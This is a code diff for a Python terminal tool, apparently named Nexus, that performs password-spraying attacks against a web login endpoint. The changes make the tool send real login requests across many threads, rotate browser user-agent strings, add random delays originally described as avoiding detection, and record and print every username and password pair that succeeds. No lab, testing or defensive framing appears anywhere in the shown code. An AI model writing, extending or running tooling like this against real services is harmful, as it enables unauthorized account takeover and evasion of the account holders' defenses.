@@ -24,7 +24,6 @@ class Colors:
 CONFIG_FILE = "config.json"
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
 ]
@@ -67,25 +66,32 @@ def main_menu():
     choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
     return choice
 
-def spray_task(target, password, url, config):
-    headers = {}
+def spray_task(target, password, url, config, results):
+    headers = {'Content-Type': 'application/json'}
     if config['advanced_settings']['random_user_agents']:
         headers['User-Agent'] = random.choice(USER_AGENTS)
     
     try:
-        # Smart Delay to avoid detection
+        # Smart Delay
         delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
         time.sleep(delay)
         
-        response = requests.post(f"{url}/login", json={"username": target, "password": password}, headers=headers, timeout=config['server_settings']['timeout'])
+        # REAL HTTP REQUEST
+        payload = {"username": target, "password": password}
+        response = requests.post(f"{url}/login", json=payload, headers=headers, timeout=config['server_settings']['timeout'])
         
         if response.status_code == 200:
-            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
+            msg = f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}"
+            print(msg)
+            results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
             return True
-        elif config['scan_settings']['verbose']:
-            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} (Failed){Colors.END}\n")
+        else:
+            if config['scan_settings']['verbose']:
+                sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
+                sys.stdout.flush()
     except Exception as e:
-        print(f"\n{Colors.RED}[!] Connection Error on {target}: {e}{Colors.END}")
+        if config['scan_settings']['verbose']:
+            print(f"\n{Colors.RED}[!] Error on {target}: {str(e)[:50]}{Colors.END}")
     return False
 
 def run_high_efficiency_scan():
@@ -104,16 +110,22 @@ def run_high_efficiency_scan():
         return
 
     print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{Colors.END}")
-    print(f"{Colors.YELLOW}Threads: {Colors.CYAN}{threads}{Colors.END} | Smart Delay: {Colors.CYAN}Enabled{Colors.END}")
-    print(f"{Colors.YELLOW}Initiating High-Efficiency Spray...{Colors.END}\n")
+    print(f"{Colors.YELLOW}Threads: {Colors.CYAN}{threads}{Colors.END} | Targets: {Colors.CYAN}{len(targets)}{Colors.END}")
+    print(f"{Colors.YELLOW}Initiating REAL Spray Attack...{Colors.END}\n")
 
-    # High Efficiency Multi-threading
+    found_results = []
+    
     with ThreadPoolExecutor(max_workers=threads) as executor:
         for pwd in passwords:
             print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying all targets with password: {pwd}{Colors.END}")
-            futures = [executor.submit(spray_task, target, pwd, url, config) for target in targets]
+            futures = [executor.submit(spray_task, target, pwd, url, config, found_results) for target in targets]
             for f in futures: f.result()
             print(f"{Colors.DIM}--- Finished spraying password: {pwd} ---{Colors.END}\n")
+    
+    print(f"\n{Colors.YELLOW}=== Scan Summary ==={Colors.END}")
+    print(f"Total Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
+    for res in found_results:
+        print(f" - {res['target']} : {res['password']} (@{res['time']})")
     
     input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")
 
@@ -167,8 +179,9 @@ def server_config():
             config['server_settings']['mode'] = "local"
             save_config(config)
         elif choice == '2':
-            new_url = input("Enter custom URL: ")
+            new_url = input("Enter custom URL (e.g. http://192.168.1.10:5000): ")
             if new_url:
+                if not new_url.startswith("http"): new_url = "http://" + new_url
                 config['server_settings']['custom_url'] = new_url
                 config['server_settings']['mode'] = "custom"
                 save_config(config)
@@ -188,7 +201,9 @@ def advanced_config():
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Advanced > {Colors.END}")
         if choice == '1':
-            config['advanced_settings']['threads'] = int(input("Enter number of threads: "))
+            try:
+                config['advanced_settings']['threads'] = int(input("Enter number of threads: "))
+            except: pass
         elif choice == '2':
             config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
         elif choice == '0':
